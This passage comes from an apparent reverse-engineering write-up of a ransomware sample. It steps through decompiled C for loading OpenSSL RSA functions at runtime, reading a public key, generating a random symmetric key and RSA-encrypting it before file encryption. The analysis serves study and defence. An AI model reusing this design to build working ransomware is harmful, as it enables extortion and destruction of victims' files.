</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_38</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here, we can see that it checks for additional arguments. These addtional arguments are specified in the <em>usage</em> message.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">local_c</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">init_libssl</span>();
</span></span></code></pre></div><p>Here, the program calls the <code>init_libssl()</code> function, that looks quite interesting so let&rsquo;s break that function down and see what happens there.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlopen</span>(<span style="color:#98c379">&#34;libssl.so&#34;</span>,<span style="color:#d19a66">2</span>);
</span></span></code></pre></div><p>We can see that this function will use <code>dlopen()</code> which uses the linker to open a <code>libssl.so</code> file. A linker is a program that links external object files with the current program.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">for</span> (<span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>; (<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0x10</span>; <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">sprintf</span>(<span style="color:#e06c75">local_38</span>,<span style="color:#98c379">&#34;libssl.so.%d&#34;</span>,(<span style="color:#e06c75">ulong</span>)<span style="color:#e06c75">local_3c</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlopen</span>(<span style="color:#e06c75">local_38</span>,<span style="color:#d19a66">2</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">0</span>) <span style="color:#c678dd">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">goto</span> <span style="color:#e06c75">LAB_00400de1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Next, we can see that if <code>plibssl == 0</code> which means if the previous <code>dlopen()</code> function fails, it will try to find some version of <code>libssl.so</code> via <code>&quot;libssl.so.%d&quot;</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">lBIO_new_mem_buf</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;BIO_new_mem_buf&#34;</span>);
</span></span></code></pre></div><p>After it finds a <code>libssl.so</code>, it uses <code>dlsym()</code> to dynamically load the <code>BIO_new_mem_buf</code> symbol from the libssl at runtime.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">lERR_error_string</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;ERR_error_string&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">lERR_error_string</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">lPEM_read_bio_RSA_PUBKEY</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;PEM_read_bio_RSA_PUBKEY&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lPEM_read_bio_RSA_PUBKEY</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">lPEM_read_bio_RSAPrivateKey</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;PEM_read_bio_RSAPrivateKey&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lPEM_read_bio_RSAPrivateKey</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">6</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">lRAND_pseudo_bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RAND_pseudo_bytes&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRAND_pseudo_bytes</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">7</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">lRSA_public_encrypt</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RSA_public_encrypt&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRSA_public_encrypt</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">8</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">lRSA_private_decrypt</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RSA_private_decrypt&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRSA_private_decrypt</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">9</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">lRSA_size</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RSA_size&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRSA_size</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>              <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">10</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>              <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This section is doing pretty much the same thing as before. So it&rsquo;s trying to grab a bunch of different functions to call later on. We derive what this program wants to do from these functions.</p>
<p>It&rsquo;s trying to get <code>PEM_read_bio_RSA_PUBKEY</code> to read an RSA public key, it&rsquo;s trying to get <code>PEM_read_bio_RSAPrivateKey</code> to read an RSA private key, it&rsquo;s trying to get <code>RAND_pseudo_bytes</code> to generate random bytes, which will probably be used for encrypting the files, etc. So we can guess that this is loading a bunch of different <strong>RSA</strong> functions to use for encrypting.</p>
<p>So that&rsquo;s the <code>init_libssl()</code> function, it&rsquo;s loading in some functions from <code>libssl</code> for the program. Let&rsquo;s go back to the <code>main</code> function and continue analyzing.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">get_pk_data</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">1</span>],<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_18</span>);
</span></span></code></pre></div><p>We can see that it&rsquo;s calling another function called <code>get_pk_data()</code>. I&rsquo;m assuming <code>pk</code> means public key because we are trying to encrypt the files and we use public key to encrypt files in asymmetric encryption as I&rsquo;ve mentioned earlier.</p>
<p>Still, let&rsquo;s jump into the function and see what it does.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">__fd</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">open_read</span>(<span style="color:#e06c75">param_1</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">__fd</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;open_pk_file&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is reading from a file. I&rsquo;m assuming it&rsquo;s the public key file.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">lseek</span>(<span style="color:#e06c75">__fd</span>,<span style="color:#d19a66">0</span>,<span style="color:#d19a66">2</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0xffffffffffffffff</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;lseek [end]&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;get_pk_data: key file is empty!&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">3</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is using <code>lseek()</code> to seek to the end of the file and make sure that the file is not empty.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">pvVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">calloc</span>(<span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pvVar1</span>;
</span></span><span style="display:flex;"><span><span style="color:#e06c75">_Var2</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">lseek</span>(<span style="color:#e06c75">__fd</span>,<span style="color:#d19a66">0</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">_Var2</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;lseek [start]&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">sVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">read</span>(<span style="color:#e06c75">__fd</span>,<span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>,<span style="color:#e06c75">__nbytes</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">sVar3</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">DAT_0040841e</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">close</span>(<span style="color:#e06c75">__fd</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here, the program is basically allocating a buffer of size <code>__nbytes + 1</code> and read from the file it just opened into that buffer, the buffer gets assigned to <code>param_2</code>, it closes the file and then after this section, it just returns.</p>
<p>So in the <code>get_pk_data()</code> function, it&rsquo;s essentially just reading the public key into the second parameter. So in the main function, I&rsquo;ll rename this parameter (now <code>local_18</code>) into <code>public_key_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">create_rsa_obj</span>(<span style="color:#e06c75">public_key_buffer</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_20</span>);
</span></span></code></pre></div><p>Back in the <code>main</code> function, next up is this <code>create_rsa_obj</code> line. So this function is probably taking in the <code>public_key_buffer</code> that <code>get_pk_data()</code> just created, generate an RSA object and probably assign that object to <code>local_20</code>.</p>
<p>To make sure my assumptions are correct, let&rsquo;s jump into that function and see.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">create_rsa_obj</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">undefined8</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">lVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">local_2c</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lBIO_new_mem_buf</span>)(<span style="color:#e06c75">param_1</span>,<span style="color:#d19a66">0xffffffff</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;BIO_new_mem_buf&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_2c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lPEM_read_bio_RSA_PUBKEY</span>)(<span style="color:#e06c75">lVar1</span>,<span style="color:#e06c75">param_2</span>,<span style="color:#d19a66">0</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;PEM_read_bio_RSA_PUBKEY&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_2c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_2c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">local_2c</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is pretty short and easy to understand so I&rsquo;ll go over it quickly. So we can see that it is calling a <em>Basic I/O memory buffer</em> function, it reads from that buffer, it creates an RSA public key object from the <code>public_key_buffer</code> and it assigns the object to <code>param_2</code>, which in our case is <code>local_20</code>. So let&rsquo;s rename <code>local_20</code> into <code>rsa_key_object</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">encrypt_file</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">2</span>],<span style="color:#e06c75">rsa_key_object</span>,<span style="color:#e06c75">local_28</span>,<span style="color:#e06c75">local_30</span>,<span style="color:#e06c75">local_38</span>);
</span></span></code></pre></div><p>Next up in the <code>main</code> function is a very interesting function. This is where the encrypting happens. We can already see that it&rsquo;s taking in <code>argv[2]</code> which is the path to a file and the <code>rsa_key_object</code>. Let&rsquo;s jump right into this function and see how it works.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">local_10</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">long</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">in_FS_OFFSET</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x28</span>);
</span></span><span style="display:flex;"><span><span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">open_read_write</span>(<span style="color:#e06c75">file_to_encrypt</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;open_read&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_74</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see that it&rsquo;s opening a specific file to read and write. It&rsquo;s reading into <code>local_3c</code> so I&rsquo;ll rename that to <code>encrypt_file_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">gen_stream_key</span>(<span style="color:#e06c75">local_38</span>,<span style="color:#d19a66">0x20</span>);
</span></span></code></pre></div><p>Here, it&rsquo;s creating a symmetric key. As we can see, it&rsquo;s taking in an <code>0x20</code> as a parameter, and any multiple of 16 or 128 bits is a symmetric stream key. So this symmetric key will be used for symmetric encryption.</p>
<p>We see that <code>local_38</code> is being passed into the function, so that&rsquo;s probably going to be the symmetric key buffer. Let&rsquo;s rename it to <code>sym_key_buffer</code></p>
<p>Let&rsquo;s see what&rsquo;s in this <code>gen_stream_key()</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5c07b">bool</span> <span style="color:#61afef;font-weight:bold">gen_stream_key</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">param_2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">int</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRAND_pseudo_bytes</span>)(<span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">param_2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;RAND_pseudo_bytes&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is generating a pseudo random symmetric key. So this symmetric key is secure. Had they used a static seed or a non-random value as a key, there would&rsquo;ve been a vulnerability in this malware and we would be able to exploit it.</p>
<p>Let&rsquo;s continue where we left off in the <code>encrypt_file()</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">rsa_encrypt</span>(<span style="color:#e06c75">param_2</span>,<span style="color:#e06c75">sym_key_buffer</span>,<span style="color:#d19a66">0x20</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_48</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_40</span>);
</span></span></code></pre></div><p>Here, it&rsquo;s calling the <code>rsa_encrypt()</code> function. Let&rsquo;s check out what this function does:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">rsa_encrypt</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_2</span>,<span style="color:#e5c07b">int</span> <span style="color:#e06c75">param_3</span>,<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">**</span><span style="color:#e06c75">param_4</span>,<span style="color:#e5c07b">int</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">int</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pvVar2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">local_44</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRSA_size</span>)(<span style="color:#e06c75">param_1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">param_3</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">iVar1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRSA_size</span>)(<span style="color:#e06c75">param_1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pvVar2</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">calloc</span>((<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_4</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pvVar2</span>;
